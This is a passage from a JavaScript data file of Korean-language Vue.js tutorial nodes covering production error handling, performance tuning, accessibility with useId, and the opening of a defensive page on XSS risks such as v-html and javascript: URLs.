            body: "(1) 운영은 경고를 전부 제거하고 에러는 기본으로 로그만 남깁니다. 먼저 app.config.errorHandler가 모니터링에 연결되어 있는지 확인하고(없으면 그 컴포넌트의 렌더 에러가 조용히 빈 컴포넌트가 됩니다. 실제로 info 'render function'으로 옴), 개발 빌드로 같은 데이터를 재현해 경고(prop 타입, 하이드레이션 불일치)를 봅니다. 소스맵을 업로드해 스택을 읽을 수 있게 합니다. (2) 운영 빌드는 info를 짧은 코드로 바꿉니다. Production Error Code Reference에서 12는 'ref function'(템플릿 ref 함수 실행 중)입니다. 0은 'setup function'. 모니터링 쪽에서 코드 → 문구 표를 두거나, 3.5+ throwUnhandledErrorInProduction로 스택을 받습니다. (3) __VUE_OPTIONS_API__를 false로 하면 Options API 지원 코드가 빠져 번들이 줄지만, 사내 코드와 서드파티(Vuetify 등)가 Options API를 쓰면 깨집니다. 전부 Composition인지 확인한 뒤에만. __VUE_PROD_DEVTOOLS__와 __VUE_PROD_HYDRATION_MISMATCH_DETAILS__는 기본 false가 맞고 진단이 필요할 때만 켭니다. 플래그는 esm-bundler 빌드에만 적용됩니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Production Deployment", href: `${DOCS}/guide/best-practices/production-deployment` },
      { label: "Compile-Time Flags", href: `${DOCS}/api/compile-time-flags` },
      { label: "Production Error Code Reference", href: `${DOCS}/error-reference/` },
    ],
  },

  {
    id: "vg-bp-performance",
    name: "성능",
    tagline: "로드 성능은 아키텍처·번들·분할로, 갱신 성능은 props 안정성·v-once·v-memo·computed 안정성·shallowRef·가상화로",
    intro:
      "베스트 프랙티스 둘째 페이지입니다. 성능을 둘로 나눕니다. 페이지 로드(LCP·INP. 아키텍처 선택이 먼저. SSR·SSG, 마케팅 페이지는 정적으로. 번들: 트리 셰이킹되는 API, 템플릿 사전 컴파일로 14kb 절약, lodash-es. 코드 분할: defineAsyncComponent·지연 라우트)와 갱신(props 안정성: 부모가 계산해 자식에 불리언만. v-once·v-memo. 3.4+ computed 안정성: 값이 바뀔 때만 깨움, 새 객체는 깨짐. 가상화. 100,000+ 접근이면 shallowRef·shallowReactive로 루트 교체. 불필요한 컴포넌트 추상화 피하기). 측정은 PageSpeed·WebPageTest(운영), DevTools·app.config.performance·Vue DevTools(개발). 실제로 돌려 보면 불리언 computed는 n이 네 번 바뀌어도 값이 바뀐 한 번만 효과(2회), 새 객체 computed는 매번(3회), v-memo=\"[it.v]\"는 같은 값 새 객체 교체에 자식 렌더 0회·하나 바꾸면 1회(v-memo 없이도 props가 같으면 자식 렌더 0), 개발·운영 빌드 크기 576KB vs 178KB. 이 노드의 질문은 하나입니다. 느림이 로드인가 갱신인가, 그리고 어느 층에서 줄이나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "둘: 페이지 로드 성능(LCP·INP. 첫 방문)과 갱신 성능(상호작용에 대한 반응). 측정: 운영은 PageSpeed Insights·WebPageTest, 개발은 Chrome DevTools Performance·app.config.performance(컴포넌트 init·compile·render·patch 추적)·Vue DevTools. 로드: '올바른 아키텍처가 먼저'. 로드 속도가 중요하면 순수 SPA를 피하고 SSR·SSG, 마케팅 페이지는 별도 정적 HTML. 번들: 트리 셰이킹되는 API만 쓰고(<Transition>처럼 안 쓰면 제거), 템플릿 사전 컴파일(런타임 컴파일러 14kb 절약), lodash 대신 lodash-es, 의존성 크기 확인. 코드 분할: defineAsyncComponent(() => import('./Foo.vue')), 지연 로드 라우트. 갱신: props 안정성 '자식 컴포넌트는 받은 props 중 하나라도 바뀌면 갱신'. <ListItem :active=\"item.id === activeId\">처럼 부모가 계산해 불리언만 넘기면 바뀐 둘만 갱신. v-once(이후 갱신 건너뜀), v-memo(의존 배열이 같으면 서브트리 건너뜀. 큰 v-for에). computed 안정성(3.4+): '계산 값이 바뀔 때만 효과를 깨움. 매번 새 객체를 돌려주면 늘 다르다고 봄 → 이전 값과 비교해 같으면 이전 값 반환. 비교 전에 전체 계산을 할 것'. 일반: 큰 리스트 가상화(vue-virtual-scroller 등). 거대 불변 구조는 shallowRef·shallowReactive로 추적 비용 줄이고 '루트 교체로만 갱신'. 컴포넌트 인스턴스는 비싸니 리스트 안 불필요한 추상화 피하기.",
        code: "// 로드 — 분할\nconst Chart = defineAsyncComponent(() => import('./Chart.vue'))\n{ path: '/report', component: () => import('./Report.vue') }\n\n// 갱신 — props 안정성: 부모가 계산, 자식은 불리언\n<ListItem v-for=\"item in list\" :id=\"item.id\" :active=\"item.id === activeId\" />   // activeId 바뀌면 둘만 갱신\n// ✗ <ListItem :item=\"item\" :active-id=\"activeId\" />   // 전부 갱신\n\n// v-memo — 큰 리스트\n<div v-for=\"item in list\" :key=\"item.id\" v-memo=\"[item.id === selected]\">…</div>\n\n// computed 안정성 (3.4+) — 객체를 돌려줄 땐 이전 값과 비교\nconst summary = computed((prev) => { const next = { count: list.value.length, hasError: list.value.some(e) }; return prev && prev.count === next.count && prev.hasError === next.hasError ? prev : next })\n\n// 거대 불변 구조\nconst shallowArray = shallowRef([/* 큰 배열 */])\nshallowArray.value = [...shallowArray.value, newObject]   // 루트 교체로만 갱신",
        terms: [
          {
            term: "props 안정성 (props stability)",
            body: "자식 컴포넌트는 '받은 props 중 하나라도 바뀌면' 다시 렌더됩니다. 리스트의 모든 자식에 activeId를 넘기면 선택이 바뀔 때 전부 갱신되지만, 부모가 item.id === activeId를 계산해 불리언 active만 넘기면 값이 바뀐 둘(이전 선택·새 선택)만 갱신됩니다. 실제로 돌려 보면 props가 같으면 자식 렌더가 0이었습니다. '바뀌는 값을 가능한 한 위에서 계산해 아래에는 안정된 값만' 내리는 것입니다.",
          },
          {
            term: "v-memo",
            body: "<div v-memo=\"[a, b]\">는 의존 배열 [a, b]의 값이 전과 같으면 그 서브트리의 갱신을 통째로 건너뜁니다(3.2+). v-memo=\"[]\"는 v-once와 같습니다. 큰 v-for(1000+)에서 선택 상태만 바뀌는 경우에 쓰고, v-for와 함께 쓸 때는 같은 요소에 둡니다. 실제로 돌려 보면 같은 값의 새 객체로 리스트를 교체했을 때 자식 렌더 0, 한 항목 값만 바꾸면 1이었습니다. 단 props가 같은 자식 컴포넌트는 v-memo 없이도 건너뛰므로, v-memo의 이득은 '요소 서브트리'와 '비교 비용 절약'에 있습니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Node에서 n을 1→3→5→6으로 바꾸며 isEven = computed(() => n % 2 === 0)에 의존하는 효과를 세니 runs 2(초기 + 6에서 값이 바뀜). 같은 변화에 obj = computed(() => ({ even }))는 runs 3(8, 10에서도 새 객체라 깨움). 3.4의 computed 안정성이 불리언에는 작동하고 새 객체에는 작동하지 않습니다. Chrome에서 <li v-for :key v-memo=\"[it.v]\"><Row :v=\"it.v\"/></li> 세 항목을 두고 리스트를 같은 값의 새 객체로 교체하니 Row 렌더 추가 0, 첫 항목 v만 바꾸니 1. v-memo 없는 같은 구조도 같은 값 새 객체 교체에 Row 렌더 0(props가 같아 컴포넌트 갱신이 건너뜀). v-once는 n이 5가 되어도 '0'을 유지했습니다. 비동기 컴포넌트는 loading → 도착으로 분할 로드가 보였습니다. 빌드 크기 개발 576KB vs 운영 178KB. 묶음 갱신은 같은 틱 셋 변경을 렌더 한 번으로. 컴파일 출력은 정적 노드 캐시(-1 CACHED)와 패치 플래그(TEXT·CLASS)로 갱신 범위를 미리 좁혔습니다(렌더링 메커니즘 노드).",
        code: "// Node — computed 안정성 (3.4+)\nisEven = computed(() => n % 2 === 0)   n: 1→3→5→6  → 의존 효과 runs 2  (값 바뀐 6 에서만)\nobjC  = computed(() => ({ even }))     n: 6→8→10   → runs 3  (매번 새 객체)\n\n// Chrome — v-memo · props 안정성\n<li v-memo=\"[it.v]\"><Row :v/></li>  같은 값 새 객체 교체 → Row 렌더 +0 · 하나 바꿈 → +1\nv-memo 없음                          같은 값 새 객체 교체 → Row 렌더 +0  (props 같으면 건너뜀)\n<b v-once>{{ n }}</b>               n=5 → '0' 유지\n\n// 크기 · 묶음 · 컴파일\n576KB (개발) vs 178KB (운영) · set ×3 → 렌더 1 · -1 CACHED · 3 TEXT,CLASS",
      },
      {
        label: "문제: 행 하나를 선택하면 1,000 행이 전부 다시 그려진다",
        body: "<Row v-for=\"r in rows\" :row=\"r\" :selected-id=\"selectedId\" />. 선택이 바뀌면 selectedId가 모든 Row의 props로 가서 1,000개가 갱신됩니다. 처방은 props 안정성입니다. :selected=\"r.id === selectedId\"로 부모가 계산해 불리언만 넘기면 값이 바뀐 두 행만 갱신됩니다(실제로 props가 같은 자식은 렌더 0). 행이 요소라면 v-memo=\"[r.id === selectedId]\"로 서브트리 비교까지 건너뜁니다. Row 안에서 const style = computed(() => ({ color }))처럼 매번 새 객체를 돌려주는 computed가 있으면 3.4 안정성이 안 작동해 하위 효과가 매번 깨어나니(실제로 3회) 원시값을 돌려주거나 이전 값과 비교합니다. 1,000행이 보이는 것이 아니라면 가상 스크롤로 DOM 자체를 줄입니다.",
      },
      {
        label: "문제가 나는 경우: 어느 층의 비용인지 모를 때",
        body: "경우 ㄱ, 불안정 props입니다. 위의 사고입니다. 경우 ㄴ, 새 객체 computed. 안정성 깨짐(실제로). 원시값·prev 비교. 경우 ㄷ, 모든 컴포넌트를 비동기로. 요청 폭증. 라우트·큰 것만. 경우 ㄹ, 런타임 컴파일러 포함 빌드. +14kb. 런타임 전용. 경우 ㅁ, lodash 전체 import. 트리 셰이킹 안 됨. lodash-es. 경우 ㅂ, 거대 데이터를 reactive로. 깊은 변환 비용. shallowRef + 루트 교체. 경우 ㅅ, 1만 행 전부 DOM에. 가상화. 경우 ㅇ, 리스트 항목마다 얇은 컴포넌트 여러 층. 인스턴스 비용. 요소로. 경우 ㅈ, v-memo를 v-for 안쪽 요소에. 동작 안 함. 같은 요소. 경우 ㅊ, v-once에 바뀌어야 하는 값. 고정됨(실제로 '0'). 제거. 경우 ㅋ, 마케팅 페이지까지 SPA. 로드 느림. 정적 HTML·SSG. 경우 ㅌ, 개발 빌드로 성능 측정. 검사 비용 포함. 운영 빌드. 경우 ㅍ, 로드 문제를 갱신 최적화(memo)로 풀려 함. 층이 다름. 아키텍처·분할.",
        code: "경우               언제 생기나                        겉모습                         처방\nㄱ 불안정 props      :selectedId 전부에                   전부 갱신                       부모 계산 · 불리언\nㄴ 새 객체 computed   computed(() => ({…}))              매번 깨움 (실제로 3)              원시값 · prev 비교\nㄷ 전부 비동기       작은 것까지                          요청 폭증                       라우트·큰 것\nㄹ 컴파일러 포함      전체 빌드                           +14kb                         런타임 전용\nㅁ lodash 전체      import _ from 'lodash'               트리 셰이킹 X                   lodash-es\nㅂ 거대 reactive     reactive(big)                      변환 비용                       shallowRef · 루트 교체\nㅅ 전부 DOM        1만 행                               느림                           가상화\nㅇ 과한 추상화       항목마다 컴포넌트 층                  인스턴스 비용                    요소\nㅈ v-memo 위치      v-for 안쪽                          안 됨                          같은 요소\nㅊ v-once 오용      바뀌는 값에                          고정 (실제로)                   제거\nㅋ 마케팅 SPA       정적 페이지까지                       LCP 느림                        정적 · SSG\nㅌ 개발 빌드 측정    dev 모드                             검사 비용                       운영 빌드\nㅍ 층 혼동         로드 문제에 memo                       효과 없음                       아키텍처 · 분할",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 성능은 두 층(로드·갱신)이고, 갱신은 다시 '비교 비용' 과 '갱신 범위' 둘이다",
        body: "로드 성능은 '얼마나 받고 실행하나'라 아키텍처(SSR·SSG ㅋ), 번들(트리 셰이킹·컴파일러 ㄹ, ㅁ), 분할(ㄷ)로 줍니다. 갱신 성능은 반응성이 '어디를 다시 돌리나'라 두 가지로 줍니다. 갱신 범위를 좁히기(props 안정성 ㄱ, computed 안정성 ㄴ, v-once ㅊ, 컴포넌트 경계)와 비교·추적 비용 줄이기(v-memo ㅈ, shallowRef ㅂ, 가상화 ㅅ, 추상화 줄이기 ㅇ). Vue의 컴파일러가 패치 플래그·정적 캐시로 기본 범위를 좁혀 두므로 사람이 할 일은 '바뀌는 값을 위로 올려 아래에 안정된 값만 내리는' 설계입니다. 측정은 운영 빌드로(ㅌ), 층을 먼저 가르고(ㅍ).",
        code: "로드:  아키텍처 (SSR·SSG ㅋ) → 번들 (트리 셰이킹 · 런타임 전용 ㄹ ㅁ) → 분할 (ㄷ)\n갱신:  범위 좁히기 — props 안정 (ㄱ) · computed 안정 (ㄴ) · v-once (ㅊ) · 컴파일러 플래그\n       비용 줄이기 — v-memo (ㅈ) · shallowRef (ㅂ) · 가상화 (ㅅ) · 추상화 ↓ (ㅇ)\n측정: 운영 빌드 (ㅌ) · 층 먼저 (ㅍ)   ·   설계: 바뀌는 값은 위로, 아래엔 안정된 값만",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 '접근성'은 누구에게나 보이게 하는 것입니다. useId가 label·aria 연결에 쓰입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 대시보드 첫 로드가 4초입니다. 차트 라이브러리와 테이블 라이브러리가 번들의 70%입니다. (2) 테이블에서 셀 하나를 편집하면 전체가 느립니다. 행마다 computed로 { bg, bold } 스타일 객체를 만듭니다. (3) 10만 개 로그를 reactive 배열에 push하니 느립니다.",
        notes: [
          {
            title: "답",
            body: "(1) 로드 층입니다. 차트·테이블 컴포넌트를 defineAsyncComponent(() => import(…))로 분할해 첫 번들에서 빼고(실제로 loading → 도착), 보이는 뷰포트 아래면 3.5 SSR의 hydrateOnVisible까지. lodash가 있으면 lodash-es로, Vue는 런타임 전용 빌드인지 확인. 마케팅성 랜딩이 같은 SPA에 있다면 정적으로 떼어냅니다. 운영 빌드로 PageSpeed를 잽니다. (2) 갱신 층, 안정성 문제입니다. 매번 새 객체를 돌려주는 computed는 값이 같아도 하위 효과를 깨웁니다(실제로 3회 vs 불리언 2회). 스타일을 원시값 둘(bg 문자열, bold 불리언)로 나누거나 computed((prev) => …)에서 같으면 prev를 돌려줍니다. 선택·편집 상태는 부모가 계산해 행에 불리언만 넘기고(props 안정성), 행이 요소면 v-memo를 겁니다. (3) 10만 개를 깊은 reactive로 두면 요소마다 프록시 변환과 추적 비용이 듭니다. const logs = shallowRef([])로 두고 logs.value = [...logs.value, ...batch]처럼 루트 교체로만 갱신합니다(문서: 거대 불변 구조는 shallowRef·루트 교체). 화면에는 가상 스크롤로 보이는 수십 행만 DOM에 둡니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Performance", href: `${DOCS}/guide/best-practices/performance` },
      { label: "v-memo", href: `${DOCS}/api/built-in-directives#v-memo` },
      { label: "shallowRef", href: `${DOCS}/api/reactivity-advanced#shallowref` },
    ],
  },

  {
    id: "vg-bp-a11y",
    name: "접근성",
    tagline: "스킵 링크, 제목 순서, 랜드마크, label 과 id — 그리고 그 id 를 만드는 useId",
    intro:
      "베스트 프랙티스 셋째 페이지입니다. 접근성은 '모든 사람이 쓸 수 있는 웹사이트'이고 Vue 특유의 것보다 HTML을 올바르게 쓰는 일이 대부분입니다. 문서의 항목: 스킵 링크(App.vue 맨 위 'Skip to main content', 포커스될 때만 보이고 라우트 변경 시 포커스 이동), 콘텐츠 구조(h1~h6 순서대로·단계 건너뛰지 말 것, header·nav·main·footer·aside·search·form·section 랜드마크), 시맨틱 폼(label의 for와 input의 id 명시적 연결이 '보조 기술 지원이 더 좋다', aria-label·aria-labelledby·aria-describedby, 'placeholder는 많은 사용자를 혼란시키니 피할 것', 폼 안 버튼은 type=\"button\"), 숨김(시각적으로만 숨기는 클래스, aria-hidden=\"true\"는 포커스 가능한 요소에 두지 말 것), 표준(WCAG 2.1 POUR, WAI-ARIA 1.2). Vue가 보태는 것은 useId()로 label·input·aria-describedby를 묶을 고유 id를 만드는 것(SSR에서도 안정). 실제로 돌려 보면 useId는 'v-0', 'v-1', app.config.idPrefix='app'이면 'app-0'이었고 서버에서도 같은 꼴이었습니다. 이 노드의 질문은 하나입니다. 보조 기술이 읽는 구조는 무엇으로 만들어지나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "스킵 링크: <a ref=\"skipLink\" href=\"#main\" class=\"skip-link\">Skip to main content</a>를 App.vue 최상단에. CSS로 포커스 전엔 숨기고(.skip-link { white-space: nowrap; margin: 1em auto; top: 0; position: fixed; left: 50%; margin-left: -72px; opacity: 0 } .skip-link:focus { opacity: 1 }) 라우트가 바뀌면 skipLink.value.focus(). 구조: 제목은 <h1>~<h6>를 순서대로 중첩, 단계 건너뛰지 말 것, 글자 크기로 흉내 내지 말 것. 랜드마크 header(banner)·nav(navigation)·main(main)·footer(contentinfo)·aside(complementary)·search·form·section(region, 레이블 필요). 폼: <label for=\"name\">과 <input id=\"name\">. 감싸는 label도 되지만 'for/id 명시가 보조 기술 지원이 더 좋다'. aria-label(보이는 레이블 없을 때), aria-labelledby(여러 id), aria-describedby(설명 연결). 'placeholder를 레이블 대신 쓰지 말 것. 혼란·대비 문제'. 안내는 aria-describedby로. 버튼은 폼 안에서 type=\"button\" 명시(제출 의도 아니면). 숨김: 시각 숨김 클래스(.visually-hidden)로 보조 기술에는 남기기. aria-hidden=\"true\"는 보조 기술에서 숨김이며 '포커스 가능한 요소에 두지 말 것'. 표준: WCAG 2.1(Perceivable·Operable·Understandable·Robust), WAI-ARIA 1.2. useId(): label·input·aria 연결용 고유 id. '같은 컴포넌트에서 여러 번 부르면 다른 id', SSR·클라이언트 간 안정, computed 안에서 부르지 말 것, 여러 앱은 app.config.idPrefix.",
        code: "<!-- 스킵 링크 -->\n<a ref=\"skipLink\" href=\"#main\" class=\"skip-link\">Skip to main content</a>\n<main id=\"main\">…</main>\n\n<!-- 폼: for/id 명시 · 설명은 aria-describedby · placeholder 아님 -->\n<script setup>\nimport { useId } from 'vue'\nconst nameId = useId(); const descId = useId()        // 'v-0' 'v-1' · SSR 과 일치\n</script>\n<label :for=\"nameId\">Name:</label>\n<input :id=\"nameId\" type=\"text\" name=\"name\" v-model=\"name\" :aria-describedby=\"descId\" />\n<p :id=\"descId\">Please provide first and last name.</p>\n\n<!-- 랜드마크 · 제목 순서 -->\n<header><nav aria-label=\"Main\">…</nav></header>\n<main><h1>Page title</h1><section aria-labelledby=\"s1\"><h2 id=\"s1\">Section</h2></section></main>\n<footer>…</footer>\n\n<!-- 숨김 -->\n<span class=\"visually-hidden\">Search</span>        <!-- 보조 기술엔 보임 -->\n<svg aria-hidden=\"true\">…</svg>                     <!-- 장식 · 포커스 불가 요소에만 -->\n<button type=\"button\">Cancel</button>              <!-- 폼 안 비제출 버튼 -->",
        terms: [
          {
            term: "useId (3.5+)",
            body: "앱 안에서 고유하고 서버·클라이언트에서 같은 문자열 id를 돌려주는 훅입니다. label의 for와 input의 id, aria-describedby처럼 '한 요소가 다른 요소를 id로 가리키는' 연결에 씁니다. 컴포넌트가 여러 번 쓰여도 id가 겹치지 않고, SSR HTML과 클라이언트 렌더가 같은 id를 만들어 하이드레이션이 맞습니다(실제로 서버·클라이언트 'v-0'). 같은 컴포넌트에서 여러 번 부르면 다른 id이고, computed 안에서 부르면 인스턴스 충돌이 날 수 있어 밖에서 선언합니다. 여러 앱이 한 페이지에 있으면 app.config.idPrefix로 가릅니다(실제로 'app-0').",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "접근성 자체(스크린 리더)는 재지 않았고 Vue가 보태는 부분을 확인했습니다. Chrome에서 setup의 useId() 둘은 'v-0', 'v-1'이었고 app.config.idPrefix = 'app'인 앱에서는 'app-0', 'app-1'. Node의 renderToString에서도 useId는 'v-0'으로 같은 꼴이라 SSR HTML의 <input id=\"v-0\">과 클라이언트의 <label for=\"v-0\">이 맞습니다. 하이드레이션 측정에서 useId를 쓴 요소는 id가 일치해 불일치 경고가 나지 않았고(텍스트 불일치만 경고), 서버 HTML에 없던 data-id 속성은 클라이언트 값으로 채워졌습니다. 폼 노드의 v-model 측정에서 v-model이 초기 value 속성을 무시한다는 것은 레이블·설명과 무관하지만, placeholder를 레이블 대신 쓰면 값이 들어간 뒤 레이블이 사라진다는 문서의 지적과 맞물립니다. Teleport로 옮긴 모달은 DOM상 body 자식이 되므로 포커스 순서·aria는 모달 컴포넌트가 직접 챙겨야 합니다(Teleport 노드).",
        code: "// useId (vue 3.5.45)\nChrome:  useId() ×2 → 'v-0' · 'v-1'      app.config.idPrefix = 'app' → 'app-0' · 'app-1'\nNode SSR: useId() → 'v-0'                 (서버 · 클라이언트 같은 꼴 → label for / input id 일치 → 불일치 없음)\n\n// 관련 측정\n하이드레이션: id 일치 요소는 경고 없음 · 텍스트 불일치만 경고\nTeleport 모달: DOM 은 body 자식 → 포커스·aria 는 모달이 직접",
        codeLang: "text",
      },
      {
        label: "문제: 재사용 입력 컴포넌트를 두 번 쓰자 label 이 첫 입력만 가리킨다",
        body: "<TextField label=\"이름\" />와 <TextField label=\"이메일\" />. TextField 안에 <label for=\"field\"><input id=\"field\">로 고정 id를 썼습니다. 같은 id가 둘이라 두 번째 레이블을 눌러도 첫 입력에 포커스가 가고 스크린 리더도 첫 것만 읽습니다. 처방은 useId입니다. const id = useId()로 인스턴스마다 다른 id('v-0', 'v-1'. 실제로 확인)를 만들어 :for와 :id에 바인딩합니다. SSR이면 서버와 클라이언트가 같은 id를 만들어 하이드레이션도 맞습니다. 설명·에러 메시지도 const descId = useId()로 만들어 aria-describedby에 넣습니다. 3.5 전이면 모듈 카운터나 props로 id를 받습니다.",
      },
      {
        label: "문제가 나는 경우: 구조를 스타일로 흉내 낼 때",
        body: "경우 ㄱ, 고정 id 중복입니다. 위의 사고입니다. 경우 ㄴ, placeholder를 레이블로. 값 입력 뒤 사라짐·대비 부족. label + for/id. 경우 ㄷ, div에 onclick으로 버튼 흉내. 포커스·키보드·역할 없음. <button>. 경우 ㄹ, 제목을 글자 크기로. 구조 없음. h1~h6 순서대로. 경우 ㅁ, 단계 건너뛴 제목(h1 → h3). 보조 기술 혼란. 순서. 경우 ㅂ, 랜드마크 없이 div만. 탐색 불가. header·nav·main·footer. 경우 ㅅ, aria-hidden을 포커스 가능 요소에. 포커스는 가되 읽히지 않음. 장식 요소에만. 경우 ㅇ, 폼 안 버튼에 type 없음. 기본 submit. type=\"button\". 경우 ㅈ, 라우트 변경 뒤 포커스 방치. 스크린 리더가 변화를 모름. 스킵 링크·제목에 포커스. 경우 ㅊ, useId를 computed 안에서. 인스턴스 충돌 가능(문서 경고). 밖에서 선언. 경우 ㅋ, 여러 앱의 useId 충돌. idPrefix. 경우 ㅌ, Teleport 모달에 포커스 트랩 없음. 배경으로 포커스 이탈. 모달 컴포넌트에서 트랩·Esc·aria-modal. 경우 ㅍ, 색만으로 상태 표시. 색맹 사용자. 텍스트·아이콘 병행.",
        code: "경우               언제 생기나                       겉모습                          처방\nㄱ 고정 id         재사용 컴포넌트                      label 이 첫 것만                   useId\nㄴ placeholder 레이블  label 없음                      입력 뒤 사라짐                     label for/id\nㄷ div 버튼        onclick div                        키보드·역할 없음                   <button>\nㄹ 스타일 제목      큰 글자 div                        구조 없음                        h1~h6\nㅁ 단계 건너뜀      h1 → h3                           혼란                            순서\nㅂ 랜드마크 없음     div 만                             탐색 불가                        header·nav·main…\nㅅ aria-hidden 포커스  버튼에                           읽히지 않음                       장식에만\nㅇ type 없음       폼 안 <button>                      제출됨                           type=\"button\"\nㅈ 포커스 방치      SPA 라우트 변경                     변화 모름                        포커스 이동\nㅊ computed useId   computed 안                        충돌 가능                        밖에서\nㅋ 앱 간 충돌       useId 둘                           같은 id                         idPrefix\nㅌ 모달 트랩 없음    Teleport 모달                       포커스 이탈                       트랩 · Esc · aria-modal\nㅍ 색만            상태를 색으로                        색맹                            텍스트 병행",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 보조 기술은 '시각' 이 아니라 '구조와 연결' 을 읽고, Vue 는 그 연결의 id 만 거든다",
        body: "스크린 리더·키보드 사용자는 화면의 모양이 아니라 접근성 트리를 봅니다. 그 트리는 시맨틱 요소(h1~h6, button, main…)의 '구조'(ㄷ, ㄹ, ㅁ, ㅂ)와 id·aria로 이은 '연결'(label↔input, 설명, ㄱ, ㄴ)로 만들어지고, 보이는 것과 다르게 숨기거나 드러낼 수 있습니다(ㅅ, 시각 숨김). SPA는 페이지 전환이 없어 '변화를 알리는' 일(포커스 ㅈ)과 Teleport처럼 DOM 자리가 바뀌는 일(ㅌ)을 앱이 챙겨야 합니다. Vue가 보태는 것은 연결에 쓸 고유·안정 id(useId ㄱ, ㅊ, ㅋ)뿐이고 나머지는 HTML을 올바르게 쓰는 것입니다. 처방은 구조는 요소로, 연결은 for/id·aria-*로, id는 useId로, 변화는 포커스로 알리는 것입니다.",
        code: "접근성 트리 = 구조 (시맨틱 요소: h1~h6 ㄹ ㅁ · button ㄷ · 랜드마크 ㅂ) + 연결 (label for/id ㄱ ㄴ · aria-describedby · aria-labelledby) + 숨김/드러냄 (visually-hidden · aria-hidden ㅅ)\nSPA 가 챙길 것: 변화 알림 (포커스 ㅈ) · 자리 바뀐 DOM (Teleport 모달 트랩 ㅌ)\nVue 가 거드는 것: useId → 고유 · SSR 안정 id (ㄱ ㅊ ㅋ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "베스트 프랙티스의 마지막 '보안'은 남의 입력이 코드가 되지 않게 하는 것입니다. 실제로 돌려 보면 {{ }}는 HTML을 이스케이프했고 템플릿 전역 허용 목록은 window를 막았습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 재사용 <SelectField>에 레이블·도움말·에러 메시지가 있습니다. 연결은? (2) 라우트가 바뀔 때 스크린 리더 사용자가 새 페이지를 알게 하려면? (3) 아이콘만 있는 삭제 버튼. 무엇을 더?",
        notes: [
          {
            title: "답",
            body: "(1) const id = useId(); const helpId = useId(); const errId = useId(). <label :for=\"id\">, <select :id=\"id\" :aria-describedby=\"[helpId, error && errId].filter(Boolean).join(' ')\" :aria-invalid=\"!!error\">, <p :id=\"helpId\">, <p v-if=\"error\" :id=\"errId\" role=\"alert\">. useId는 인스턴스마다 다르고 SSR과 일치합니다(실제로 'v-0', 'v-1'). placeholder는 레이블 대신 쓰지 않습니다. (2) 문서의 스킵 링크 패턴입니다. App.vue 맨 위에 <a ref=\"skipLink\" href=\"#main\" class=\"skip-link\">를 두고 router.afterEach에서 skipLink.value.focus()(또는 새 페이지의 h1에 tabindex=\"-1\"을 두고 포커스). 포커스가 옮겨지면 스크린 리더가 그 지점을 읽어 변화를 알립니다. 페이지 제목(document.title)도 함께 바꿉니다. (3) <button type=\"button\" aria-label=\"삭제\"><TrashIcon aria-hidden=\"true\" /></button>. 보이는 텍스트가 없으니 aria-label로 이름을 주고, 아이콘 SVG는 aria-hidden으로 장식 처리(포커스 불가 요소라 괜찮음). 폼 안이면 type=\"button\"으로 제출을 막습니다. 어떤 항목을 지우는지 알려야 하면 :aria-label=\"`${item.name} 삭제`\".",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Accessibility", href: `${DOCS}/guide/best-practices/accessibility` },
      { label: "useId()", href: `${DOCS}/api/composition-api-helpers#useid` },
      { label: "WAI-ARIA Authoring Practices", href: "https://www.w3.org/WAI/ARIA/apg/" },
    ],
  },

  {
    id: "vg-bp-security",
    name: "보안",
    tagline: "신뢰할 수 없는 템플릿은 절대 — {{ }} 는 이스케이프되지만 v-html·URL·style·핸들러는 당신 몫",
    intro:
      "베스트 프랙티스 마지막 페이지입니다. 첫 규칙: '신뢰할 수 없는 콘텐츠를 컴포넌트 템플릿으로 쓰지 말 것'. 임의 JS 실행과 같고 SSR이면 서버 침해까지. Vue가 하는 것: 텍스트 보간 {{ }}와 속성 바인딩은 자동 이스케이프(textContent·setAttribute 사용). 위험한 자리 넷: v-html(원시 HTML. '사용자 제공 HTML은 샌드박스 iframe 밖에서는 100% 안전할 수 없다'), :href=\"userUrl\"(javascript: URL. sanitize-url 등으로, '백엔드에서 저장 전에 소독'), :style=\"userStyle\"(클릭재킹. 객체 문법으로 특정 속성만), 이벤트 핸들러 속성에 사용자 JS('샌드박스 iframe 밖에서는 안전할 수 없다'). 서버가 렌더한 사용자 콘텐츠가 든 노드에 Vue를 마운트하지 말 것. CSRF·XSSI는 백엔드. 실제로 돌려 보면 {{ '<b>x</b>' }}는 글자 그대로 보였고(이스케이프), 템플릿 식은 허용 목록 밖 전역(window·performance)을 읽지 못했으며, 템플릿 문자열을 가진 컴포넌트는 서버·브라우저에서 런타임 컴파일되어 실행됐습니다(그래서 사용자 문자열을 템플릿으로 쓰면 실행). 이 노드의 질문은 하나입니다. 어느 자리에서 데이터가 코드가 되나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "취약점 보고: security@vuejs.org. 규칙 1: 'Never use non-trusted content as your component template'. 템플릿은 컴파일되어 실행되는 코드라 사용자 문자열을 template이나 innerHTML(in-DOM)로 쓰면 임의 JS 실행. SSR이면 서버에서. Vue가 하는 것: HTML 콘텐츠 <h1>{{ userProvidedString }}</h1>은 textContent로 넣어 이스케이프, 동적 속성 <h1 :title=\"userProvidedString\">은 setAttribute로 이스케이프. 잠재 위험: v-html(<div v-html=\"userProvidedHtml\">은 원시 HTML. 렌더 함수의 innerHTML도. '사용자 HTML은 샌드박스 iframe 안이 아니면 100% 안전할 수 없다'), URL 주입(<a :href=\"userProvidedUrl\">에 javascript:. sanitize-url 같은 라이브러리로 소독하되 '백엔드에서 저장 전에'), 스타일 주입(<a :style=\"userProvidedStyles\">로 position·배경을 조작해 클릭재킹. Vue는 <style>{{ }}</style>을 막지만 :style은 됨. 객체 문법으로 color·background 같은 특정 속성만), JS 주입(<a :onclick=\"…\"> 같은 핸들러 속성에 사용자 JS. '샌드박스 iframe 밖에서는 안전할 수 없다'). 모범 사례: 사용자 콘텐츠를 